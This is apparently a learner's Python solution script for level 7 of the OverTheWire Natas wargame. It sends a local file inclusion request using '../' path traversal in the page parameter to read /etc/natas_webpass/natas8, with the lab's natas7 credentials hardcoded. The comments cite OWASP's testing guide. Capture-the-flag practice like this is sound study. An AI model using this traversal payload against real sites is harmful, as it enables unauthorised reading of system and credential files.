#!/usr/bin/env python

#using requests module for python, not sure if I will need to install anything for this?
import requests
import re

username = 'natas7'
password = 'jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr'
url = 'http://%s.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8' % username
print(url) #make sure the URL works fine



session = requests.Session()

response = requests.get(url, auth = (username, password))
#yields <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
# this page of relevance: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
#basically we see that there are two example pages using index.php?page=
#we can do the same to look for files
#the URL above says to try ../../../ to home directory yourself (since we don't know where we are) and then include stuff after
#so we can do that and then just paste the file into there and boom it shows up

content = response.text


######################
#print(content)

#classic regexing
print(re.findall('<br>\n(.*)\n\n', content))